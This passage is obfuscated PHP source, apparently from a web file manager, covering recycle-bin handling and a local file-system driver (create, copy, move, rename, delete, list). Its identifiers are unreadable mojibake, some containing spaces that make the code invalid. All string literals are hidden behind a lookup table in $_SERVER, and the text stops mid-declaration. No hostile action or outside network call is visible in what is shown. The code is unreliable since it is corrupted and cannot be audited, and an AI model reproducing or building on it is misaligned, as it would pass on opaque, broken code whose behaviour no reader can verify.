public function fileNameExist($®Ş÷Ñ±á, $•’ùª³ó) { $Îë¶²Ì¸ =& $_SERVER[™»È’øè]; $º¿¬Ì§Ì = $this->field($Îë¶²Ì¸[2185])->where(array($Îë¶²Ì¸[179] => $®Ş÷Ñ±á, $Îë¶²Ì¸[32] => $•’ùª³ó, $Îë¶²Ì¸[472] => 0))->find(); return is_array($º¿¬Ì§Ì) ? $º¿¬Ì§Ì[$Îë¶²Ì¸[180]] : !1; } public function childList($â°òò±‹) { $ü ¿Å´Í =& $_SERVER[™»È’øè]; $Î¾Ö¸é¤ = $ü ¿Å´Í[2158] . $â°òò±‹; if (isset(self::$cacheChildList[$Î¾Ö¸é¤])) { return self::$cacheChildList[$Î¾Ö¸é¤]; } $İÎ¨ª‹È = array($ü ¿Å´Í[179] => intval($â°òò±‹), $ü ¿Å´Í[472] => 0); $Öşš«™Œ = $this->where($İÎ¨ª‹È)->select(); $Öşš«™Œ = $Öşš«™Œ ? $Öşš«™Œ : array(); self::$cacheChildList[$Î¾Ö¸é¤] = $Öşš«™Œ; foreach ($Öşš«™Œ as $ñïÜìüú) { $Î¾Ö¸é¤ = $ü ¿Å´Í[500] . $ñïÜìüú[$ü ¿Å´Í[180]]; self::$cacheSourceInfo[$Î¾Ö¸é¤] = $ñïÜìüú; } return $Öşš«™Œ; } public function fileNameAuto($¨ïîœ±, $ç·äš¹ä, $Ã¾™‹÷” = REPEAT_RENAME, $¦óõÕ’À = false) { $—Ğ‘ñÀ =& $_SERVER[™»È’øè]; $İ–îÉÜÈ = get_path_ext($ç·äš¹ä); $ŞªÁË•Í = $İ–îÉÜÈ ? basename($ç·äš¹ä, $—Ğ‘ñÀ[10] . $İ–îÉÜÈ) . $—Ğ‘ñÀ[2186] . $İ–îÉÜÈ : $ç·äš¹ä . $—Ğ‘ñÀ[427]; $ß¯¶†ÕÄ = array($—Ğ‘ñÀ[179] => $¨ïîœ±, $—Ğ‘ñÀ[472] => 0, $—Ğ‘ñÀ[32] => array($—Ğ‘ñÀ[426], $ŞªÁË•Í)); $ìïÕá—‚ = $this->field($—Ğ‘ñÀ[32])->where($ß¯¶†ÕÄ)->select(); $´ßˆ¯úİ = array_to_keyvalue($ìïÕá—‚, $—Ğ‘ñÀ[12], $—Ğ‘ñÀ[32]); return $this->fileNameAutoGet($´ßˆ¯úİ, $ç·äš¹ä, $Ã¾™‹÷”, $¦óõÕ’À); } public function fileNameAutoGet($Úê¶ÎÕ‹, $«¿Ç¤‡¨, $ë¦‚†ÑĞ, $ŞÙËÑìì) { $ÒÓŸÆ¹´ =& $_SERVER[™»È’øè]; if ($ë¦‚†ÑĞ == REPEAT_REPLACE || !$Úê¶ÎÕ‹ || !in_array_not_case($«¿Ç¤‡¨, $Úê¶ÎÕ‹) || $ŞÙËÑìì && $ë¦‚†ÑĞ != REPEAT_RENAME_FOLDER) { return $«¿Ç¤‡¨; } if ($ë¦‚†ÑĞ == REPEAT_SKIP) { return !1; } $Ù†–èìé = $ÒÓŸÆ¹´[10] . get_path_ext($«¿Ç¤‡¨); $Ù†–èìé = $Ù†–èìé == $ÒÓŸÆ¹´[10] || $ŞÙËÑìì ? $ÒÓŸÆ¹´[12] : $Ù†–èìé; for ($ÃôòÆîˆ = 1; $ÃôòÆîˆ <= count($Úê¶ÎÕ‹) + 1; $ÃôòÆîˆ++) { $Ş®¸›ª‹ = substr($«¿Ç¤‡¨, 0, strlen($«¿Ç¤‡¨) - strlen($Ù†–èìé)); $•ÏÍ¡à = $Ş®¸›ª‹ . "\x28{$ÃôòÆîˆ}\x29{$Ù†–èìé}"; if (!in_array_not_case($•ÏÍ¡à, $Úê¶ÎÕ‹)) { return $•ÏÍ¡à; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\x75\162\x63\x65\x5f\x72\x65\x63\171\143\154\145"; protected $dataAuto = array(array("\143\x72\145\141\164\x65\x54\x69\155\145", "\x74\x69\155\x65", "\x69\x6e\163\145\162\x74", "\x66\165\156\x63\x74\x69\157\156")); public function listData($‰‹ï•Û = false) { $‘ˆ™Ô¨‹ =& $_SERVER[™»È’øè]; $‰‹ï•Û = $‰‹ï•Û ? $‰‹ï•Û : USER_ID; $Ü…æ§¥‘ = $this->where(array($‘ˆ™Ô¨‹[1669] => $‰‹ï•Û))->select(); return array_to_keyvalue($Ü…æ§¥‘, $‘ˆ™Ô¨‹[12], $‘ˆ™Ô¨‹[180]); } public function moveToRecycle($Ä˜áŒØë) { $·–ÄÅ°à =& $_SERVER[™»È’øè]; $Éµäóºï = Model($·–ÄÅ°à[1362]); $öÌ­¢ûï = $Éµäóºï->sourceInfo($Ä˜áŒØë); if (!$öÌ­¢ûï || $öÌ­¢ûï[$·–ÄÅ°à[472]] == $·–ÄÅ°à[88]) { return; } $‘åû¥š” = array($·–ÄÅ°à[458] => $Ä˜áŒØë, $·–ÄÅ°à[1669] => USER_ID, $·–ÄÅ°à[615] => $öÌ­¢ûï[$·–ÄÅ°à[177]], $·–ÄÅ°à[616] => $öÌ­¢ûï[$·–ÄÅ°à[537]], $·–ÄÅ°à[619] => $öÌ­¢ûï[$·–ÄÅ°à[552]]); $this->add($‘åû¥š”); $this->recycleMove($Ä˜áŒØë, 1); if ($öÌ­¢ûï[$·–ÄÅ°à[452]] == $·–ÄÅ°à[88]) { $Â¥ÃË­¾ = array($·–ÄÅ°à[619] => array($·–ÄÅ°à[579], $öÌ­¢ûï[$·–ÄÅ°à[552]] . $Ä˜áŒØë . $·–ÄÅ°à[580])); $Éµäóºï->where($Â¥ÃË­¾)->setField($·–ÄÅ°à[472], 1); } } public function clear() { $this->remove(!1); } public function remove($äö…°®½ = false, $áş›¢ô = false) { $Ğò€Êü =& $_SERVER[™»È’øè]; $áş›¢ô = $áş›¢ô ? $áş›¢ô : USER_ID; $øßË´É† = Model($Ğò€Êü[1362]); $«ÜèÚ÷Ë = $this->listData($áş›¢ô); $äö…°®½ = $äö…°®½ === !1 ? !1 : $äö…°®½; $‹„ŠüÈş = array(); foreach ($«ÜèÚ÷Ë as $íù ‘) { if ($äö…°®½ != !1 && !in_array($íù ‘, $äö…°®½)) { continue; } $ó€ÕÄ†² = $øßË´É†->sourceInfo($íù ‘); $øßË´É†->remove($íù ‘, !1); $¿ç¼Ï = $ó€ÕÄ†²[$Ğò€Êü[177]] . $Ğò€Êü[11] . $ó€ÕÄ†²[$Ğò€Êü[537]]; $‹„ŠüÈş[$¿ç¼Ï] = array($Ğò€Êü[615] => $ó€ÕÄ†²[$Ğò€Êü[177]], $Ğò€Êü[537] => $ó€ÕÄ†²[$Ğò€Êü[537]]); $this->where(array($Ğò€Êü[180] => $íù ‘))->delete(); } foreach ($‹„ŠüÈş as $™ˆ€ŸˆÄ) { $øßË´É†->targetSpaceUpdate($™ˆ€ŸˆÄ[$Ğò€Êü[177]], $™ˆ€ŸˆÄ[$Ğò€Êü[537]]); } } public function restore($Ï¯Èîª¦ = false) { $ì÷Ÿˆ¯ = $this->listData(); $this->_restoreSource($ì÷Ÿˆ¯, $Ï¯Èîª¦); } public function removeUserAll($„ö³Ö³) { $this->remove(!1, $„ö³Ö³); } private function _restoreSource($Â÷Õì¢ª, $îÌ™³˜º) { $³Ñ¢Àœ÷ =& $_SERVER[™»È’øè]; $š£æÕûô = Model($³Ñ¢Àœ÷[1362]); $îÌ™³˜º = $îÌ™³˜º == !1 ? !1 : $îÌ™³˜º; if (!$Â÷Õì¢ª) { return !0; } $«ô‘ƒ³² = array(); foreach ($Â÷Õì¢ª as $â¥Š Ïß) { if ($îÌ™³˜º != !1 && !in_array($â¥Š Ïß, $îÌ™³˜º)) { continue; } $½Úéöî = $š£æÕûô->sourceInfo($â¥Š Ïß); $Šš‰¨Ì = $š£æÕûô->sourceInfo($½Úéöî[$³Ñ¢Àœ÷[179]]); if ($Šš‰¨Ì[$³Ñ¢Àœ÷[472]] == $³Ñ¢Àœ÷[88]) { continue; } $š£æÕûô->lockMoveStart($â¥Š Ïß); $this->recycleMove($â¥Š Ïß, 0); if ($½Úéöî[$³Ñ¢Àœ÷[452]] == $³Ñ¢Àœ÷[88]) { $ñò¦´«Ş = array($³Ñ¢Àœ÷[619] => array($³Ñ¢Àœ÷[579], $½Úéöî[$³Ñ¢Àœ÷[552]] . $â¥Š Ïß . $³Ñ¢Àœ÷[580])); $š£æÕûô->where($ñò¦´«Ş)->setField($³Ñ¢Àœ÷[472], 0); $this->restoreFolderChildren($â¥Š Ïß, $Â÷Õì¢ª); } $this->where(array($³Ñ¢Àœ÷[180] => $â¥Š Ïß))->delete(); $š£æÕûô->folderSizeReset($½Úéöî[$³Ñ¢Àœ÷[179]]); $«ô‘ƒ³²[] = $½Úéöî[$³Ñ¢Àœ÷[179]]; if ($½Úéöî[$³Ñ¢Àœ÷[452]] == $³Ñ¢Àœ÷[88]) { $«ô‘ƒ³²[] = $â¥Š Ïß; } $š£æÕûô->lockMoveEnd($â¥Š Ïß); } $š£æÕûô->updateModifyTime($«ô‘ƒ³²); } private function restoreFolderChildren($Ù ³™óİ, $şòÔà±³) { $”›ˆ’Ğ° =& $_SERVER[™»È’øè]; $Úå¦€ï = Model($”›ˆ’Ğ°[1362]); $¯İÕÄ¡¥ = array($”›ˆ’Ğ°[180] => array($”›ˆ’Ğ°[7], array())); foreach ($şòÔà±³ as $å¯æ›Á) { if ($å¯æ›Á == $Ù ³™óİ) { continue; } if (!$Úå¦€ï->isParentOf($Ù ³™óİ, $å¯æ›Á)) { continue; } $°º¬±Î = $Úå¦€ï->sourceInfo($å¯æ›Á); if ($°º¬±Î[$”›ˆ’Ğ°[452]] == $”›ˆ’Ğ°[88]) { $¯İÕÄ¡¥[] = array($”›ˆ’Ğ°[619] => array($”›ˆ’Ğ°[579], $°º¬±Î[$”›ˆ’Ğ°[552]] . $å¯æ›Á . $”›ˆ’Ğ°[580])); } else { $¯İÕÄ¡¥[$”›ˆ’Ğ°[180]][1][] = $å¯æ›Á; } } if (!$¯İÕÄ¡¥[$”›ˆ’Ğ°[180]][1]) { unset($¯İÕÄ¡¥[$”›ˆ’Ğ°[180]]); } if (!$¯İÕÄ¡¥) { return; } if (is_array($¯İÕÄ¡¥[$”›ˆ’Ğ°[180]]) && is_array($¯İÕÄ¡¥[$”›ˆ’Ğ°[180]][1])) { $¯İÕÄ¡¥[$”›ˆ’Ğ°[180]][1] = array_unique($¯İÕÄ¡¥[$”›ˆ’Ğ°[180]][1]); } $¯İÕÄ¡¥[$”›ˆ’Ğ°[1030]] = $”›ˆ’Ğ°[1968]; $Úå¦€ï->where($¯İÕÄ¡¥)->setField($”›ˆ’Ğ°[472], 1); } private function recycleMove($”å°ğ³ç, $×´³İ‘¿ = 1) { $úÇ“Éóş =& $_SERVER[™»È’øè]; $û¥Õòé’ = Model($úÇ“Éóş[1362]); $±Êì„½ì = Model($úÇ“Éóş[2187]); $ó†É›ì‡ = array($úÇ“Éóş[180] => $”å°ğ³ç); if ($×´³İ‘¿) { $û¥Õòé’->where($ó†É›ì‡)->setField($úÇ“Éóş[472], 1); $±Êì„½ì->eventRecycle($”å°ğ³ç, $úÇ“Éóş[2188]); } else { $¸ÒÍ÷¥Ÿ = $û¥Õòé’->where($ó†É›ì‡)->find(); $Ä ÌÜçš = $¸ÒÍ÷¥Ÿ[$úÇ“Éóş[452]] == $úÇ“Éóş[88]; $Àä™¸Í“ = $û¥Õòé’->fileNameAuto($¸ÒÍ÷¥Ÿ[$úÇ“Éóş[179]], $¸ÒÍ÷¥Ÿ[$úÇ“Éóş[32]], REPEAT_RENAME_FOLDER, $Ä ÌÜçš); if ($Àä™¸Í“ != $¸ÒÍ÷¥Ÿ[$úÇ“Éóş[32]]) { $û¥Õòé’->rename($”å°ğ³ç, $Àä™¸Í“); } $û¥Õòé’->where($ó†É›ì‡)->setField($úÇ“Éóş[472], 0); $±Êì„½ì->eventRecycle($”å°ğ³ç, $úÇ“Éóş[2189]); } } } goto cè‰­é¿İ°; c‚Âçç­×¾: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($»ƒË˜Ì„) { if (substr($»ƒË˜Ì„, 0, 2) == $_SERVER[™»È’øè][1308]) { $»ƒË˜Ì„ = BASIC_PATH . substr($»ƒË˜Ì„, 2); } return $»ƒË˜Ì„; } public function iconvApp($Å¦ª¢Ğ‘) { $œš§â­Ø =& $_SERVER[™»È’øè]; global $config; return $this->iconvTo($Å¦ª¢Ğ‘, $config[$œš§â­Ø[1381]], $config[$œš§â­Ø[1380]]); } public function iconvSystem($ğÎóúş) { $ÂÅÇşú =& $_SERVER[™»È’øè]; global $config; return $this->iconvTo($ğÎóúş, $config[$ÂÅÇşú[1380]], $config[$ÂÅÇşú[1381]]); } public function getPathOuter($áå²‹ª·) { $¯ıéŞ½ƒ =& $_SERVER[™»È’øè]; $ö™œ…ã = $this->iconvApp($this->pathBase); $áå²‹ª· = $this->iconvApp($áå²‹ª·); if (substr($ö™œ…ã, 0, 2) == $¯ıéŞ½ƒ[1308]) { $ö™œ…ã = BASIC_PATH . substr($ö™œ…ã, 2); } if (substr($áå²‹ª·, 0, 2) == $¯ıéŞ½ƒ[1308]) { $áå²‹ª· = BASIC_PATH . substr($áå²‹ª·, 2); } $ö™œ…ã = KodIO::clear($ö™œ…ã); $áå²‹ª· = KodIO::clear($áå²‹ª·); $áå²‹ª· = substr($áå²‹ª·, strlen($ö™œ…ã)); if (empty($this->pathDriver)) { return $áå²‹ª·; } return $this->pathDriver . $¯ıéŞ½ƒ[8] . ltrim($áå²‹ª·, $¯ıéŞ½ƒ[8]); } public function mkfile($³şòÈÚ, $»‹ˆÉ· = '', $¾’”¤æ¨ = REPEAT_RENAME) { $³şòÈÚ = $this->iconvSystem($³şòÈÚ); @touch($³şòÈÚ); if ($»‹ˆÉ·) { file_put_contents($³şòÈÚ, $»‹ˆÉ·); } @chmod($³şòÈÚ, $this->pathAuth); return is_file($³şòÈÚ) ? $this->getPathOuter($³şòÈÚ) : !1; } public function mkdir($«ï Å, $ß§æä = REPEAT_SKIP) { $«ï Å = $this->iconvSystem($«ï Å); if (is_dir($«ï Å)) { return $this->getPathOuter($«ï Å); } @mkdir($«ï Å, $this->pathAuth, !0); @chmod($«ï Å, $this->pathAuth); return is_dir($«ï Å) ? $this->getPathOuter($«ï Å) : !1; } public function copyFile($†½¢„ñÀ, $¸”æÏè) { $this->mkdir($this->pathFather($¸”æÏè)); $†½¢„ñÀ = $this->iconvSystem($†½¢„ñÀ); $¸”æÏè = $this->iconvSystem($¸”æÏè); $¢úÄôáÌ = copy_64($†½¢„ñÀ, $¸”æÏè); @chmod($¸”æÏè, $this->pathAuth); return $¢úÄôáÌ ? $this->getPathOuter($¸”æÏè) : !1; } public function moveFile($ö¾–ÑË, $èÑ¾œ) { $this->mkdir($this->pathFather($èÑ¾œ)); $ö¾–ÑË = $this->iconvSystem($ö¾–ÑË); $èÑ¾œ = $this->iconvSystem($èÑ¾œ); $òàË¿È = intval(@rename($ö¾–ÑË, $èÑ¾œ)); if (!$òàË¿È) { if ($òàË¿È = intval(@copy_64($ö¾–ÑË, $èÑ¾œ))) { @unlink($ö¾–ÑË); } } @chmod($èÑ¾œ, $this->pathAuth); return $òàË¿È ? $this->getPathOuter($èÑ¾œ) : !1; } public function movePath($‹±Š”Œú, $”õşç¸, $õÓëÆÈ” = false) { $¯Ğ„„±¼ =& $_SERVER[™»È’øè]; $‹±Š”Œú = $this->iconvSystem($‹±Š”Œú); $”õşç¸ = $this->iconvSystem($”õşç¸); $û§ÙÃõë = rtrim($”õşç¸, $¯Ğ„„±¼[8]) . $¯Ğ„„±¼[8] . ($õÓëÆÈ” ? $õÓëÆÈ” : get_path_this($‹±Š”Œú)); if (file_exists($û§ÙÃõë)) { return !1; } $–¢¤ıé¼ = intval(@rename($‹±Š”Œú, $û§ÙÃõë)); $–¢¤ıé¼ = file_exists($û§ÙÃõë); return $–¢¤ıé¼ ? $this->getPathOuter($û§ÙÃõë) : !1; } public function delFile($¼’±Ã€Í) { $¼’±Ã€Í = $this->iconvSystem($¼’±Ã€Í); if (!@unlink($¼’±Ã€Í)) { @chmod($¼’±Ã€Í, $this->pathAuth); if (!@unlink($¼’±Ã€Í)) { return !1; } } else { return !0; } } public function delFolder($¯¦»­„ò) { $†Ä‰ÕŸ =& $_SERVER[™»È’øè]; $¯¦»­„ò = $this->iconvSystem($¯¦»­„ò); if (!is_dir($¯¦»­„ò)) { return !0; } if (!($á–ì†íà = opendir($¯¦»­„ò))) { return !1; } while (($¶â“…ùÍ = readdir($á–ì†íà)) !== !1) { if ($¶â“…ùÍ == $†Ä‰ÕŸ[10] || $¶â“…ùÍ == $†Ä‰ÕŸ[1309]) { continue; } $ÇÒÕµÅ = $¯¦»­„ò . $†Ä‰ÕŸ[8] . $¶â“…ùÍ; if (is_file($ÇÒÕµÅ) || is_link($ÇÒÕµÅ)) { if (!unlink($ÇÒÕµÅ)) { chmod($ÇÒÕµÅ, $this->pathAuth); if (!unlink($ÇÒÕµÅ)) { return !1; } } } else { if (is_dir($ÇÒÕµÅ)) { chmod($ÇÒÕµÅ, $this->pathAuth); $ÇÒÕµÅ = $this->iconvApp($ÇÒÕµÅ); if (!$this->delFolder($ÇÒÕµÅ)) { return !1; } } } } closedir($á–ì†íà); return rmdir($¯¦»­„ò); } public function rename($Ó¦³©ê’, $’º•ôâş) { $İÀ°Ê’Á =& $_SERVER[™»È’øè]; $›¬ˆÎ¥É = $this->fileNameAuto($this->pathFather($Ó¦³©ê’), $’º•ôâş); $›¬ˆÎ¥É = $this->iconvSystem($›¬ˆÎ¥É); $Ó¦³©ê’ = $this->iconvSystem($Ó¦³©ê’); $£§Ì¬óÑ = $this->pathFather($Ó¦³©ê’); $ä±ˆãªí = rtrim($£§Ì¬óÑ, $İÀ°Ê’Á[8]) . $İÀ°Ê’Á[8] . $›¬ˆÎ¥É; $Ì”Œ‡Ë¬ = @rename($Ó¦³©ê’, $ä±ˆãªí); $ä±ˆãªí = $this->iconvApp($ä±ˆãªí); return $Ì”Œ‡Ë¬ ? $this->getPathOuter($ä±ˆãªí) : !1; } public function size($§íûË“´) { $§íûË“´ = $this->iconvSystem($§íûË“´); return filesize_64($§íûË“´); } public function info($Û°¸„Òˆ) { $Û°¸„Òˆ = $this->iconvSystem($Û°¸„Òˆ); if ($this->isFolder($Û°¸„Òˆ)) { return $this->folderInfo($Û°¸„Òˆ); } else { if ($this->isFile($Û°¸„Òˆ)) { return $this->fileInfo($Û°¸„Òˆ); } } return !1; } protected function infoChildren($Î®±ŠØğ, &$Ë¾ÖÂ­, $¶ÂÕÆ­Ò = true) { $‰«Õ¤êñ =& $_SERVER[™»È’øè]; check_abort_echo(); $Î®±ŠØğ = rtrim($Î®±ŠØğ, $‰«Õ¤êñ[8]) . $‰«Õ¤êñ[8]; if ($¶ÂÕÆ­Ò) { $Î®±ŠØğ = $this->iconvSystem($Î®±ŠØğ); } if (!($ğø…³­Ş = @opendir($Î®±ŠØğ))) { return; } while (($”Ğ´¥Ÿ— = readdir($ğø…³­Ş)) !== !1) { if ($”Ğ´¥Ÿ— == $‰«Õ¤êñ[10] || $”Ğ´¥Ÿ— == $‰«Õ¤êñ[1309]) { continue; } $µºçğ”‘ = $Î®±ŠØğ . $”Ğ´¥Ÿ—; if (is_file($µºçğ”‘) || is_link($µºçğ”‘)) { $Ë¾ÖÂ­[$‰«Õ¤êñ[77]]++; $Ë¾ÖÂ­[$‰«Õ¤êñ[76]] += filesize_64($µºçğ”‘); } else { if (is_dir($µºçğ”‘)) { $Ë¾ÖÂ­[$‰«Õ¤êñ[78]]++; $this->infoChildren($µºçğ”‘, $Ë¾ÖÂ­, !1); } } } closedir($ğø…³­Ş); } private function folderInfo($¢˜’ú—ò, $á–ßÚº¹ = false) { $ÚÊİÇï =& $_SERVER[™»È’øè]; $¢˜’ú—ò = rtrim($¢˜’ú—ò, $ÚÊİÇï[8]) . $ÚÊİÇï[8]; $Ú¾ÙØî = $this->iconvApp($this->pathThis($¢˜’ú—ò)); if ($á–ßÚº¹) { return array($ÚÊİÇï[32] => $Ú¾ÙØî, $ÚÊİÇï[84] => $this->getPathOuter($¢˜’ú—ò), $ÚÊİÇï[33] => $ÚÊİÇï[75]); } $¥“ş‹ = array($ÚÊİÇï[32] => $Ú¾ÙØî, $ÚÊİÇï[84] => $this->getPathOuter($¢˜’ú—ò), $ÚÊİÇï[33] => $ÚÊİÇï[75], $ÚÊİÇï[214] => @filectime($¢˜’ú—ò), $ÚÊİÇï[85] => @filemtime($¢˜’ú—ò), $ÚÊİÇï[1391] => @fileatime($¢˜’ú—ò), $ÚÊİÇï[1392] => is_readable($¢˜’ú—ò), $ÚÊİÇï[1393] => is_writable($¢˜’ú—ò), $ÚÊİÇï[1394] => get_mode($¢˜’ú—ò)); return $¥“ş‹; } private function fileInfo($´˜Ôä‡Å, $ßÒ ±™ó = false) { $”ÍÆÑ¡Ó =& $_SERVER[™»È’øè]; $êÁ‹ã¼¬ = $this->iconvApp($this->pathThis($´˜Ôä‡Å)); if ($ßÒ ±™ó) { return array($”ÍÆÑ¡Ó[32] => $êÁ‹ã¼¬, $”ÍÆÑ¡Ó[84] => $this->getPathOuter($´˜Ôä‡Å), $”ÍÆÑ¡Ó[33] => $”ÍÆÑ¡Ó[213], $”ÍÆÑ¡Ó[76] => $this->size($´˜Ôä‡Å), $”ÍÆÑ¡Ó[174] => $this->ext($êÁ‹ã¼¬)); } $’™Âš¤ = array($”ÍÆÑ¡Ó[32] => $êÁ‹ã¼¬, $”ÍÆÑ¡Ó[84] => $this->getPathOuter($´˜Ôä‡Å), $”ÍÆÑ¡Ó[33] => $”ÍÆÑ¡Ó[213], $”ÍÆÑ¡Ó[214] => @filectime($´˜Ôä‡Å), $”ÍÆÑ¡Ó[85] => @filemtime($´˜Ôä‡Å), $”ÍÆÑ¡Ó[1391] => @fileatime($´˜Ôä‡Å), $”ÍÆÑ¡Ó[76] => $this->size($´˜Ôä‡Å), $”ÍÆÑ¡Ó[174] => $this->ext($êÁ‹ã¼¬), $”ÍÆÑ¡Ó[1392] => is_readable($´˜Ôä‡Å), $”ÍÆÑ¡Ó[1393] => is_writable($´˜Ôä‡Å), $”ÍÆÑ¡Ó[1394] => get_mode($´˜Ôä‡Å)); return $’™Âš¤; } public function exist($µèíüƒ‚) { $µèíüƒ‚ = $this->iconvSystem($µèíüƒ‚); return @file_exists($µèíüƒ‚); } public function isFile($øü¸õ³²) { $øü¸õ³² = $this->iconvSystem($øü¸õ³²); return @is_file($øü¸õ³²); } public function isFolder($‚õˆƒìñ) { $‚õˆƒìñ = $this->iconvSystem($‚õˆƒìñ); return @is_dir($‚õˆƒìñ); } public function listPath($² êÈ´ö, $¬¸óıêØ = false) { $ÉÃ„åìŒ =& $_SERVER[™»È’øè]; $² êÈ´ö = $this->iconvSystem($² êÈ´ö); $² êÈ´ö = rtrim($² êÈ´ö, $ÉÃ„åìŒ[8]) . $ÉÃ„åìŒ[8]; $ÔşÖÌ‹ı = array($ÉÃ„åìŒ[82] => array(), $ÉÃ„åìŒ[83] => array()); if (!($È½‘ĞæŸ = @opendir($² êÈ´ö))) { return $ÔşÖÌ‹ı; } while (($Ï‚éİä± = readdir($È½‘ĞæŸ)) !== !1) { if ($Ï‚éİä± == $ÉÃ„åìŒ[10] || $Ï‚éİä± == $ÉÃ„åìŒ[1309]) { continue; } $œúÆĞÑ = $² êÈ´ö . $Ï‚éİä±; if (is_file($œúÆĞÑ)) { $ÔşÖÌ‹ı[$ÉÃ„åìŒ[83]][] = $this->fileInfo($œúÆĞÑ, $¬¸óıêØ); } else { $ÔşÖÌ‹ı[$ÉÃ„åìŒ[82]][] = $this->folderInfo($œúÆĞÑ, $¬¸óıêØ); } } closedir($È½‘ĞæŸ); return $ÔşÖÌ‹ı; } public function listAll($—ØÖÄ¦, &$ı±¤Üê = array()) { $Äç—ÓŠ‰ =& $_SERVER[™»È’øè]; $—ØÖÄ¦ = $this->iconvSystem($—ØÖÄ¦); $—ØÖÄ¦ = rtrim($—ØÖÄ¦, $Äç—ÓŠ‰[8]) . $Äç—ÓŠ‰[8]; if (!($†€«€¦ = @opendir($—ØÖÄ¦))) { return $ı±¤Üê; } while (($æ± ôÚª = readdir($†€«€¦)) !== !1) { if ($æ± ôÚª == $Äç—ÓŠ‰[10] || $æ± ôÚª == $Äç—ÓŠ‰[1309]) { continue; } $ÄÚõûÙ = $—ØÖÄ¦ . $æ± ôÚª; $‘äËÊüİ = is_dir($ÄÚõûÙ) && !is_link($ÄÚõûÙ) ? 1 : 0; $ÄÚõûÙ = $‘äËÊüİ ? $ÄÚõûÙ . $Äç—ÓŠ‰[8] : $ÄÚõûÙ; $ı±¤Üê[] = array($Äç—ÓŠ‰[84] => $ÄÚõûÙ, $Äç—ÓŠ‰[75] => $‘äËÊüİ, $Äç—ÓŠ‰[85] => intval(@filemtime($ÄÚõûÙ)), $Äç—ÓŠ‰[76] => $‘äËÊüİ ? 0 : intval($this->size($ÄÚõûÙ))); if ($‘äËÊüİ) { $this->listAll($ÄÚõûÙ, $ı±¤Üê); } } closedir($†€«€¦); return $ı±¤Üê; } public function has($‡¾Ò¼ûÇ, $¢éÑš½Ş = false, $ŒÜ¬†ù = true) { $‚­±´Œˆ =& $_SERVER[™»È’øè]; $‡¾Ò¼ûÇ = $this->iconvSystem($‡¾Ò¼ûÇ); $‡¾Ò¼ûÇ = rtrim($‡¾Ò¼ûÇ, $‚­±´Œˆ[8]) . $‚­±´Œˆ[8]; if (!($‘äÃ§ = @opendir($‡¾Ò¼ûÇ))) { return !1; } $Éª–şÅ” = 0; $£´€ÖßÊ = 0; $»—Íİµ  = 0; while (($Ãä½’ÙÁ = readdir($‘äÃ§)) !== !1) { if ($Ãä½’ÙÁ == $‚­±´Œˆ[10] || $Ãä½’ÙÁ == $‚­±´Œˆ[1309]) { continue; } $»³ç—ÁÇ = $‡¾Ò¼ûÇ . $Ãä½’ÙÁ; if ($¢éÑš½Ş) { $»—Íİµ ++; if (@is_file($»³ç—ÁÇ)) { $Éª–şÅ”++; } else { $£´€ÖßÊ++; } if ($»—Íİµ  > 10000) { break; } continue; } if ($ŒÜ¬†ù) { if (@is_file($»³ç—ÁÇ)) { return !0; } } else { if (@is_dir($»³ç—ÁÇ . $‚­±´Œˆ[8])) { return !0; } } } closedir($‘äÃ§); if ($¢éÑš½Ş) { return array($‚­±´Œˆ[222] => $Éª–şÅ”, $‚­±´Œˆ[223] => $£´€ÖßÊ); } return !1; } public function hashSimple($Ù†„§Ó) { $€­Æ¢û¡ =& $_SERVER[™»È’øè]; if (!$Ù†„§Ó) { return md5($€­Æ¢û¡[12]); } $Ù†„§Ó = $this->iconvSystem($Ù†„§Ó); $ÂÄ°ò§ = $this->size($Ù†„§Ó); $ªò‹ü“ = 200; $óÃÊó‘ = 50; if ($ÂÄ°ò§ <= $ªò‹ü“ * $óÃÊó‘) { return $this->hashMd5($Ù†„§Ó) . $ÂÄ°ò§; } $Ñ¼Çûç = $€­Æ¢û¡[12]; $ÍâïÙëä = intval($ÂÄ°ò§ / $óÃÊó‘); $«´˜†œ¬ = fopen($Ù†„§Ó, $€­Æ¢û¡[1395]); if (!$«´˜†œ¬) { return $Ñ¼Çûç; } for ($ÒÎ“°Ûù = 0; $ÒÎ“°Ûù < $óÃÊó‘; $ÒÎ“°Ûù++) { fseek_64($«´˜†œ¬, $ÍâïÙëä * $ÒÎ“°Ûù); $Ñ¼Çûç .= fread($«´˜†œ¬, $ªò‹ü“); } fseek_64($«´˜†œ¬, $ÂÄ°ò§ - $ªò‹ü“); $Ñ¼Çûç .= fread($«´˜†œ¬, $ªò‹ü“); fclose($«´˜†œ¬); return md5($Ñ¼Çûç) . $ÂÄ°ò§; } public function getContent($©Ä©ĞÒÇ) { $©Ä©ĞÒÇ = $this->iconvSystem($©Ä©ĞÒÇ); return file_get_contents($©Ä©ĞÒÇ); } public function setContent($ôé¦„ûİ, $Å›¼âÖ‹ = '') { $ôé¦„ûİ = $this->iconvSystem($ôé¦„ûİ); $˜Ä÷ÒÙ“ = @file_put_contents($ôé¦„ûİ, $Å›¼âÖ‹, LOCK_EX); clearstatcache(); @chmod($ôé¦„ûİ, $this->pathAuth); return $˜Ä÷ÒÙ“ === !1 ? !1 : !0; } public function fileSubstr($ëÇ„ÔÎÈ, $¤¡ÚÒœï = 0, $ÌÌÎ… = false) { $ÙÔÑú =& $_SERVER[™»È’øè]; $ëÇ„ÔÎÈ = $this->iconvSystem($ëÇ„ÔÎÈ); if ($ÌÌÎ… === !1) { $ÌÌÎ… = $this->size($ëÇ„ÔÎÈ); } if ($ÌÌÎ… <= 0) { return $ÙÔÑú[12]; } $ ÏÓâ£ = fopen($ëÇ„ÔÎÈ, $ÙÔÑú[1395]); if (!$ ÏÓâ£) { return !1; } fseek_64($ ÏÓâ£, $¤¡ÚÒœï); $´×ü²ş = fread($ ÏÓâ£, $ÌÌÎ…); fclose($ ÏÓâ£); return $´×ü²ş; } public function upload($¬áõÇàø, $äÆ°Ïüä, $ı‘Ë¦Ñ· = false, $³õÄ›Éâ = REPEAT_REPLACE) { if ($ı‘Ë¦Ñ·) { return $this->moveFile($äÆ°Ïüä, $¬áõÇàø); } return $this->copyFile($äÆ°Ïüä, $¬áõÇàø); } public function setModifyTime($Á»Ôáí¤, $®·Ù±û  = '') { @touch($Á»Ôáí¤, intval($®·Ù±û )); } public function download($—ê·Ù¨ˆ, $¥ˆÔ–) { return $this->iconvSystem($—ê·Ù¨ˆ); } } class PathDriverOOS extends PathDriverBaseS3 { public function 